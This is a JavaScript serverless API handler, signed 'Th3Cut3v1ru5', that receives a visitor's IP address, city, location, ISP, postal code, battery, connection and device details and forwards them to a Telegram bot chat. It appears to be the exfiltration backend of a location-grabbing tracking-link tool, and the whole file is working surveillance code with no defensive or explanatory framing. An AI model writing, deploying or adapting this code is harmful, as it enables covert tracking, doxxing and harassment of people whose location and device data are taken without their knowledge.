export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { 
      ip, region, city, country, location, isp, postal, timezone,
      battery, charging, connectionType, networkSpeed, downlink, dataSaver,
      device, browser, language, screen, colorDepth, pixelRatio, localTimezone
    } = req.body;

    const message = `Proudly Created by Th3Cut3v1ru5

📍 LOCATION INFO:
IP = ${ip}
Region = ${region}
City = ${city}
Country = ${country}
Location = ${location}
ISP = ${isp}
Postal Code = ${postal}
Timezone = ${timezone}

🔋 BATTERY & CONNECTION:
Battery = ${battery}
Charging = ${charging}
Connection = ${connectionType}
Network Speed = ${networkSpeed}
Downlink = ${downlink}
Data Saver = ${dataSaver}

📱 DEVICE INFO:
Device = ${device}
Browser = ${browser}
Language = ${language}
Screen = ${screen}
Color Depth = ${colorDepth}
Pixel Ratio = ${pixelRatio}
Local Timezone = ${localTimezone}`;

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({ error: 'Missing env variables' });
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    const result = await response.json();

    if (!response.ok) {
      console.error('Telegram error:', result);
      return res.status(500).json({ error: 'Telegram API error', details: result });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ error: error.message });
  }
}
